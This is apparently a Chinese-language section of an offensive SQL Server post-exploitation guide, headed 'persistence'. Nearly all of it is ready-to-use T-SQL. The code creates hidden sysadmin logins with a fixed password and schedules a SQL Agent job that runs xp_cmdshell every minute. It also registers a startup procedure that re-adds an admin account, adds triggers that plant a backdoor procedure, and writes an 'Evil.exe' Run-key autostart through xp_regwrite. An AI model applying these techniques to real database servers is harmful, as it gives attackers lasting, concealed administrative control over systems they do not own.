## 持久化

### 创建系统管理员用户

```sql
CREATE LOGIN ghostwolf WITH PASSWORD = '1234qwer!@#$';
ALTER SERVER ROLE sysadmin ADD MEMBER ghostwolf;

SELECT p.name, p.type_desc
FROM sys.server_role_members rm
JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id
WHERE rm.role_principal_id = (
    SELECT principal_id FROM sys.server_principals WHERE name = 'sysadmin'
);
```

### 代理作业

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = N'whoami';
//创建一个名为whoami的作业
EXEC dbo.sp_add_jobstep @job_name = N'whoami', @step_name = N'Step1', @subsystem = N'TSQL', @command = N'EXEC xp_cmdshell ''whoami'';', @retry_attempts = 5, @retry_interval = 5;
//像作业添加步骤，在步骤中使用xp_cmdshell执行whoami命令
EXEC dbo.sp_add_schedule @schedule_name = N'whoami_task', @freq_type = 4, @freq_interval = 1, @freq_subday_type = 4, @freq_subday_interval = 1, @freq_relative_interval = 0, @freq_recurrence_factor = 0, @active_start_time = 1;
//为作业设置每分钟运行一次
EXEC dbo.sp_attach_schedule @job_name = N'whoami', @schedule_name = N'whoami_task';
//将计划任务附加到作业
EXEC dbo.sp_add_jobserver @job_name = N'whoami', @server_name = N'(local)';
//将作业设置为在本地实例上运行
```

### 触发器

```sql
USE MASTER
GO

CREATE PROCEDURE useradd  //创建名为useradd的触发器
AS
CREATE LOGIN wildwolf WITH PASSWORD = '1234qwer!@#$';
//触发执行查询语句，该例为创建用户
EXEC sp_addsrvrolemember 'wildwolf', 'sysadmin';
//将该创建的用户添加至系统管理员
GO
```

设置为登录触发

```sql
EXEC sp_procoption @ProcName = 'useradd',
@OptionName = 'startup',
@OptionValue = 'on';
```

#### DDL触发器

```sql
CREATE TRIGGER DDL_AddProcedure
ON DATABASE
FOR CREATE_TABLE, ALTER_TABLE, DROP_TABLE
AS
BEGIN
    EXEC ('CREATE PROCEDURE BackdoorProcedure AS RETURN 0;');
END;
```

#### DML触发器

```sql
CREATE TRIGGER DML_ReinsertData
ON dbo.ImportantTable
AFTER DELETE
AS
BEGIN
    INSERT INTO dbo.ImportantTable (Col1, Col2)
    SELECT d.Col1, d.Col2 FROM deleted AS d;
END;
```

### xp_regwrite

```sql
EXEC master..xp_regwrite
    @rootkey = 'HKEY_LOCAL_MACHINE',
    //指定根注册表配置单元
    @key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    //启动过程所检查的键
    @value_name = 'Evil',
    //创建或修改的注册表值得名称
    @type = 'REG_SZ',
    //指定注册表值的类型
    @value = 'Evil.exe';
    //注册表项的值，启动时运行的可执行文件的路径
```
